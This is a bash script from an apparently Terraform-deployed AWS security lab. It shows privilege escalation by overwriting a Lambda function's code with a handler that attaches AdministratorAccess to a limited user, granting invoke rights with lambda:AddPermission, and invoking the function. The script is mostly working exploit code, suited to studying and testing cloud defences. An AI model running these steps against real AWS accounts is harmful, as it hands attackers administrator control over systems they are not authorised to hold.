#!/bin/bash

# Demo script for lambda:UpdateFunctionCode + lambda:AddPermission privilege escalation
# This scenario demonstrates how a user with lambda:UpdateFunctionCode and lambda:AddPermission
# can modify existing Lambda function code and invoke it to gain administrative access.


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-lambda-005-to-admin-starting-user"
TARGET_LAMBDA="pl-prod-lambda-005-to-admin-target-lambda"
LAMBDA_EXEC_ROLE="pl-prod-lambda-005-to-admin-lambda-exec-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Lambda UpdateFunctionCode + AddPermission Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_lambda_005_lambda_updatefunctioncode_lambda_addpermission.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 5: Get information about the target Lambda function
echo -e "${YELLOW}Step 5: Getting target Lambda function details${NC}"
use_readonly_creds
echo "Target Lambda function: $TARGET_LAMBDA"

show_cmd "ReadOnly" "aws lambda get-function --region $AWS_REGION --function-name $TARGET_LAMBDA --query 'Configuration.FunctionArn' --output text"
LAMBDA_ARN=$(aws lambda get-function \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --query 'Configuration.FunctionArn' \
    --output text)

echo "Lambda ARN: $LAMBDA_ARN"
echo -e "${GREEN}✓ Found target Lambda function${NC}\n"

# [OBSERVATION] Step 6: Backup original Lambda function code
echo -e "${YELLOW}Step 6: Backing up original Lambda function code${NC}"
aws lambda get-function \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --query 'Code.Location' \
    --output text > /tmp/original_lambda_url.txt

echo -e "${GREEN}✓ Backed up original Lambda function metadata${NC}\n"

# Step 7: Create malicious Lambda code
echo -e "${YELLOW}Step 7: Creating malicious Lambda code${NC}"
echo "Creating Python code that will attach AdministratorAccess to our user..."

cat > /tmp/lambda_function.py << EOF
import boto3
import json

def lambda_handler(event, context):
    """
    Malicious Lambda function that grants admin access to the starting user
    """
    iam = boto3.client('iam')

    try:
        # Attach AdministratorAccess policy to the starting user
        starting_user = '$STARTING_USER'

        iam.attach_user_policy(
            UserName=starting_user,
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )

        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': 'Successfully attached AdministratorAccess',
                'user': starting_user
            })
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({
                'message': 'Error attaching policy',
                'error': str(e)
            })
        }
EOF

# Create zip file
cd /tmp
zip -q lambda_function.zip lambda_function.py
cd - > /dev/null

echo -e "${GREEN}✓ Created malicious Lambda code${NC}\n"

# [EXPLOIT] Step 8: Update Lambda function code
echo -e "${YELLOW}Step 8: Updating Lambda function with malicious code${NC}"
use_starting_creds
echo "Using lambda:UpdateFunctionCode permission..."

show_attack_cmd "Attacker" "aws lambda update-function-code --region $AWS_REGION --function-name $TARGET_LAMBDA --zip-file fileb:///tmp/lambda_function.zip --output text"
aws lambda update-function-code \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --zip-file fileb:///tmp/lambda_function.zip \
    --output text > /dev/null

echo -e "${GREEN}✓ Successfully updated Lambda function code${NC}\n"

# [EXPLOIT] Step 9: Add resource-based permission to allow invoking the function
echo -e "${YELLOW}Step 9: Adding resource-based permission to invoke the function${NC}"
echo "Using lambda:AddPermission to allow our user to invoke the function..."

# Use a unique statement ID to avoid conflicts
STATEMENT_ID="AllowStartingUserInvoke-$(date +%s)"

show_attack_cmd "Attacker" "aws lambda add-permission --region $AWS_REGION --function-name $TARGET_LAMBDA --statement-id \"$STATEMENT_ID\" --action \"lambda:InvokeFunction\" --principal \"arn:aws:iam::$ACCOUNT_ID:user/$STARTING_USER\" --output text"
aws lambda add-permission \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --statement-id "$STATEMENT_ID" \
    --action "lambda:InvokeFunction" \
    --principal "arn:aws:iam::$ACCOUNT_ID:user/$STARTING_USER" \
    --output text > /dev/null

echo -e "${GREEN}✓ Successfully added invoke permission${NC}\n"

# Wait for Lambda to process the update
echo -e "${YELLOW}Waiting 15 seconds for Lambda to process updates...${NC}"
sleep 15
echo -e "${GREEN}✓ Lambda updates processed${NC}\n"

# [EXPLOIT] Step 10: Invoke the malicious Lambda function
echo -e "${YELLOW}Step 10: Invoking malicious Lambda function${NC}"
use_starting_creds
echo "Executing Lambda function to attach AdministratorAccess policy..."

show_attack_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '{}' /tmp/response.json --query 'StatusCode' --output text"
INVOKE_RESPONSE=$(aws lambda invoke \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --payload '{}' \
    /tmp/response.json \
    --query 'StatusCode' \
    --output text)

if [ "$INVOKE_RESPONSE" == "200" ]; then
    echo -e "${GREEN}✓ Lambda function executed successfully${NC}"
    echo "Response:"
    cat /tmp/response.json | jq .
    echo ""
else
    echo -e "${RED}✗ Lambda invocation failed${NC}"
    cat /tmp/response.json
    exit 1
fi

# Wait for IAM policy propagation
echo -e "${YELLOW}Waiting 15 seconds for IAM policy to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ Policy propagated${NC}\n"

# [OBSERVATION] Step 11: Verify administrator access
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
use_readonly_creds
echo "Attempting to list IAM users..."

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Used lambda:UpdateFunctionCode to modify Lambda function: $TARGET_LAMBDA"
echo "3. Used lambda:AddPermission to grant ourselves invoke permissions"
echo "4. Invoked modified Lambda function running as privileged role: $LAMBDA_EXEC_ROLE"
echo "5. Lambda attached AdministratorAccess policy to our user"
echo "6. Achieved: Full administrator access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (UpdateFunctionCode) → $TARGET_LAMBDA → (AddPermission) → Self Invoke"
echo "  → (InvokeFunction) → Execute as $LAMBDA_EXEC_ROLE → Attach AdministratorAccess → Admin Access"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Modified Lambda function: $TARGET_LAMBDA"
echo "- Added resource-based permission: $STATEMENT_ID"
echo "- AdministratorAccess policy attached to: $STARTING_USER"
echo "- Temporary files: /tmp/lambda_function.py, /tmp/lambda_function.zip, /tmp/response.json"

echo -e "\n${RED}⚠ Warning: Lambda function contains malicious code and AdministratorAccess is attached${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
